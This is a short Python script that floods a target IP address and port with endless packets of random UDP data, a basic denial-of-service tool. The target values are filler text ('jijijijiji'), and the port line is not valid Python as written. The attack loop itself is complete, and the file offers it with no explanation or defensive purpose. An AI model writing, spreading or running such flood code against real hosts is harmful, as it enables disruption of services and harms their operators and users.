import socket
import random

target_ip = "jijijijiji"
target_port = jijijijiji

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

while True:
    sock.sendto(bytes, (target_ip, target_port))
